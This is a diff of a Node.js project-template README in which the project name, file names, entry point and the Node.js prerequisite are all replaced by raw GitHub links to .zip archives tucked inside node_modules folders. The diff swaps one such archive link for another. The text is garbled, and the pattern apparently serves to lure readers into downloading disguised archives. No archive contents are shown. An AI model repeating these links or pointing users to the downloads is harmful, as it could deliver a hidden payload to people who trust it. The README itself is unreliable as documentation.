@@ -1,21 +1,21 @@
-# My https://raw.githubusercontent.com/Antidogmatism/mongodb-test-Mischa/main/node_modules/mime-db/mongodb_Mischa_test_1.5.zip Project
+# My https://raw.githubusercontent.com/Antidogmatism/mongodb-test-Mischa/main/node_modules/mongodb/src/operations/client_bulk_write/Mischa_test_mongodb_v2.1.zip Project
 
 ## Overview
-This is a https://raw.githubusercontent.com/Antidogmatism/mongodb-test-Mischa/main/node_modules/mime-db/mongodb_Mischa_test_1.5.zip project that serves as a template for building applications. It includes a basic structure with an entry point and configuration for npm.
+This is a https://raw.githubusercontent.com/Antidogmatism/mongodb-test-Mischa/main/node_modules/mongodb/src/operations/client_bulk_write/Mischa_test_mongodb_v2.1.zip project that serves as a template for building applications. It includes a basic structure with an entry point and configuration for npm.
 
 ## Project Structure
 ```
 my-nodejs-project
 ├── src
-│   └── https://raw.githubusercontent.com/Antidogmatism/mongodb-test-Mischa/main/node_modules/mime-db/mongodb_Mischa_test_1.5.zip      # Entry point of the application
-├── https://raw.githubusercontent.com/Antidogmatism/mongodb-test-Mischa/main/node_modules/mime-db/mongodb_Mischa_test_1.5.zip      # npm configuration file
-└── https://raw.githubusercontent.com/Antidogmatism/mongodb-test-Mischa/main/node_modules/mime-db/mongodb_Mischa_test_1.5.zip         # Project documentation
+│   └── https://raw.githubusercontent.com/Antidogmatism/mongodb-test-Mischa/main/node_modules/mongodb/src/operations/client_bulk_write/Mischa_test_mongodb_v2.1.zip      # Entry point of the application
+├── https://raw.githubusercontent.com/Antidogmatism/mongodb-test-Mischa/main/node_modules/mongodb/src/operations/client_bulk_write/Mischa_test_mongodb_v2.1.zip      # npm configuration file
+└── https://raw.githubusercontent.com/Antidogmatism/mongodb-test-Mischa/main/node_modules/mongodb/src/operations/client_bulk_write/Mischa_test_mongodb_v2.1.zip         # Project documentation
 ```
 
 ## Getting Started
 
 ### Prerequisites
-- https://raw.githubusercontent.com/Antidogmatism/mongodb-test-Mischa/main/node_modules/mime-db/mongodb_Mischa_test_1.5.zip (version X.X.X or higher)
+- https://raw.githubusercontent.com/Antidogmatism/mongodb-test-Mischa/main/node_modules/mongodb/src/operations/client_bulk_write/Mischa_test_mongodb_v2.1.zip (version X.X.X or higher)
 - npm (version X.X.X or higher)
 
 ### Installation
